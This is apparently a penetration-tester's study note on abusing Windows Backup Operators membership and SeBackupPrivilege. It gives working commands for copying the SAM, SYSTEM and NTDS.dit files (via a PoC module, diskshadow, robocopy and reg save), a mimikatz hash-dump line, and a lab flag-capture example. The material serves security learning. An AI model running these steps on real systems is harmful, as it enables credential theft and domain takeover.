---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: draft
---
## `Backup Operators` 

![[🛠️ Windows groups#`Backup Operators`]]

## `SeBackupPrivilege`

![[🛠️ Windows privileges#`SeBackupPrivilege`]]


## `SeBackupPrivilege.ps1`

To exploit `SeBackupPrivilege`, you can use the [`SeBackupPrivilege.ps1 PoC`](https://github.com/giuliano108/SeBackupPrivilege):

1. Import modules:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```
```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Enable the privilege  — this alone lets you traverse (`cd` into) any directory — local or remote — and list (`dir`, `Get-ChildItem`) its contents:

```powershell
Set-SeBackupPrivilege
```

3. Verify if the privilege is enabled:

```bash
Get-SeBackupPrivilege
```

4. Copy protected files:

```powershell
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\SAM
```

```powershell
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

>[!warning] The `copy` command won't work with `SeBackupPrivilege`, as normal NTFS permissions will take over.

### Copying `NTDS.dit` using `diskshadow`

As the `NTDS.dit` file is locked by default, we can use the Windows [`diskshadow`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The `NTDS.dit` in this shadow copy won't be in use by the system.

```powershell
powershell-session
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows

```

You can then extract secrets from `NTDS.dit` using `secretsdump.py`. See [[NTDS secrets]].


## `robocopy`

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```


- Relevant `robocopy` options:

| Option   | Description                                                        |
| -------- | ------------------------------------------------------------------ |
| `/b`     | Copy in **backup mode** (bypasses ACLs using `SeBackupPrivilege`). |
| `/zb`    | Use restartable mode; if denied, fallback to `/b`.                 |
| `/z`     | Restartable mode (does not bypass ACLs).                           |
| `/e`     | Copy all subdirectories **including empty ones**.                  |
| `/s`     | Copy subdirectories (excluding empty ones).                        |
| `/lev:n` | Limit recursion depth.                                             |

| Option      | Description                                    |
| ----------- | ---------------------------------------------- |
| `/copy:DAT` | Copy Data, Attributes, Timestamps (default).   |
| `/copyall`  | Copy **all metadata** (ACLs, owner, auditing). |
| `/sec`      | Copy files with security (ACLs).               |
| `/secfix`   | Fix security even on skipped files.            |

| Option   | Description                                      |
| -------- | ------------------------------------------------ |
| `/mir`   | Mirror source → destination (includes deletion). |
| `/purge` | Delete files in destination not in source.       |
| `/mov`   | Move files (delete from source).                 |
| `/move`  | Move files + directories.                        |

| Option | Description                               |
| ------ | ----------------------------------------- |
| `/r:n` | Retry count (default: insane 1M retries). |
| `/w:n` | Wait time between retries.                |
| `/tbd` | Wait for network share availability.      |

| Option       | Description           |
| ------------ | --------------------- |
| `/log:file`  | Write output to file. |
| `/log+:file` | Append to log.        |
| `/v`         | Verbose output.       |
| `/np`        | No progress output.   |
| `/nfl`       | No file list.         |
| `/ndl`       | No directory list.    |

## Backup and extract the SAM database

One of the primary ways to exploit `Backup Operators` is by accessing and extracting the **SAM (Security Account Manager) database** (and LSA secrets if in AD). The **SAM** database contains password hashes for local user accounts, including **`Administrator`** and **`SYSTEM`**.

1. Backup the `SAM` and `SYSTEM` registry hives:

```powershell
reg save HKLM\SAM C:\Windows\Temp\sam.hive
```

```powershell
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```
`

- `reg save` works here because `SeBackupPrivilege` gives rights to read files otherwise inaccessible.

2. Extract password hashes:
	- Once you've backed up the hives, you can copy them to your attacker machine and use tools like `mimikatz` to extract password hashes from the **SAM**. You can then use them for [[🛠️ Pass-the-Hash]] attacks or crack them with tools like `JohnTheRipper`.

```powershell
sekurlsa::samdump::local C:\Windows\Temp\sam.hive C:\Windows\Temp\system.hive
```

>[!note] `SAM` is encrypted using a system key stored in `SYSTEM`, that's why we need both to extract the hashes. 

>[!note] See [[Registry & LSA secrets]].

## Example

Target file:

```powershell
C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
```

```powershell
PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------                                                     

Privilege Name                Description                    State          ============================= ============================== ========       SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 
```

- Import [`SeBackupPrivilege.ps1 PoC`](https://github.com/giuliano108/SeBackupPrivilege) modules:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```
```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

- Enable `SeBackupPrivilege`:

```powershell
Set-SeBackupPrivilege
```

- Verify if the privilege is enabled:

```bash
Get-SeBackupPrivilege
```
```powershell
SeBackupPrivilege is enabled
```

- Copy the target file:

```powershell
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt C:\Windows\Temp\flag.txt
```
```powershell
Coped 30 bytes
```

- Read the flag normally (`cat`/`type` and all other normal commands will work after backing up ????why????):

```powershell
cat C:\Windows\Temp\flag.txt
```
```powershell
Car3ful_w1th_gr0up_m3mberSh1p!         
```
## References and further reading

- [`Back up files and directories - security policy setting — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [`CreateFileA function — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
- [`Backup Operators — OSCP-CPTS NOTES`](https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/backup-operators)